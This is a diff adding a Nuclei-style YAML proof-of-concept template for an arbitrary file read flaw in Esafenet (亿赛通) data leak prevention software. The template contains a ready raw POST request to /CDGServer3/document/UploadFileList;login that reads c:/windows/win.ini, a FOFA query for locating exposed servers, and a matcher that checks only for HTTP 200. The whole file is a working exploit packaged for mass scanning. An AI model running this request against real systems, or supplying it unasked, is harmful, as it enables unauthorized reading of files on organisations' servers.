@@ -1,0 +1,51 @@
+id: poc-1000660714
+info:
+  name: 亿赛通 数据泄露防护 UploadFileList login接口任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: file-upload,lfi,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: body="/CDGServer3/index.jsp"
+http:
+- raw:
+  - 'POST /CDGServer3/document/UploadFileList;login HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    command=VeiwUploadFile&filePath=c:/windows/win.ini&fileName1=hello
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    app
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
